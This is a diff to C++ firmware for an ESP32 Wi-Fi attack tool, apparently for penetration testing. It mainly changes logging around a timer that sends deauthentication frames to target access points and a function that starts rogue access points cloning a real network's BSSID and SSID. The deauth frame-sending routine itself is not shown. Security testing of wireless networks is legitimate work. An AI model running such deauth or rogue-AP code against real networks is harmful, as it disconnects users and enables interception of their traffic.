@@ -8,7 +8,8 @@
  */
 #include "attack_method.h"
 
-#include <string.h>
+#include <cstring>
+#include <string>
 #define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
 #include "esp_err.h"
 #include "esp_log.h"
@@ -18,7 +19,7 @@
 #include "wsl_bypasser.h"
 
 namespace {
-const char* TAG = "main:attack_method";
+const char* LOG_TAG = "main:attack_method";
 esp_timer_handle_t deauth_timer_handle;
 esp_timer_handle_t rogueap_timer_handle;
 
@@ -29,6 +30,8 @@ typedef struct {
 multiple_rogue_ap_data_t* gMmultipleRogueApData = NULL;
 }  // namespace
 
+extern bool gShouldLimitAttackLogs;
+
 /**
  * @brief Callback for periodic deauthentication frame timer
  *
@@ -38,6 +41,25 @@ multiple_rogue_ap_data_t* gMmultipleRogueApData = NULL;
  */
 static void timer_send_deauth_frame(void* arg) {
   ap_records_t* ap_records = (ap_records_t*)arg;
+
+  std::string ap_ssids;
+  for (int i = 0; i < ap_records->len; ++i) {
+    ap_ssids += (const char*)ap_records->records[i]->ssid;
+    ap_ssids += ", ";
+  }
+  ap_ssids.pop_back();
+
+  if (gShouldLimitAttackLogs) {
+    static uint64_t cnt{0};
+    if ((cnt % 60) == 0) {
+      // Print log only once in 60 times (once per minute)
+      ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
+    }
+    ++cnt;
+  } else {
+    ESP_LOGI(LOG_TAG, "Sending deauth frame to APs with SSIDs [%s]", ap_ssids.c_str());
+  }
+
   for (int i = 0; i < ap_records->len; ++i) {
     wsl_bypasser_send_deauth_frame(ap_records->records[i]);
   }
@@ -65,7 +87,7 @@ void attack_method_broadcast_stop() {
  * @details Starts offering new Rogue AP in the list
  */
 void start_rogue_ap(const wifi_ap_record_t* ap_record) {
-  ESP_LOGD(TAG, "Starting Rogue AP with SSID '%s'", ap_record->ssid);
+  ESP_LOGI(LOG_TAG, "Starting Rogue AP with SSID '%s'", ap_record->ssid);
   wifictl_set_ap_mac(ap_record->bssid);
   wifi_config_t ap_config = {.ap = {
                                  "",                                       // SSID
@@ -78,11 +100,6 @@ void start_rogue_ap(const wifi_ap_record_t* ap_record) {
                                  0                                         // beacon_interval
                              }};
 
-  // .ap = {.ssid_len = (uint8_t)strlen((char*)ap_record->ssid),
-  //        .channel = ap_record->primary,
-  //        .authmode = ap_record->authmode,
-  //        .password = "dummypassword",
-  //        .max_connection = 1}};
   mempcpy(ap_config.sta.ssid, ap_record->ssid, 32);
   wifictl_ap_start(&ap_config);
 }
@@ -136,7 +153,7 @@ void start_multiple_rogue_ap_attack(ap_records_t* ap_records, uint16_t per_ap_ti
  */
 void attack_method_rogueap(ap_records_t* ap_records, uint16_t per_ap_timeout) {
   if (gMmultipleRogueApData != NULL) {
-    ESP_LOGE(TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
+    ESP_LOGE(LOG_TAG, "Failed to start RogueAP attack: previous attack is not finished yet");
     return;
   }
 
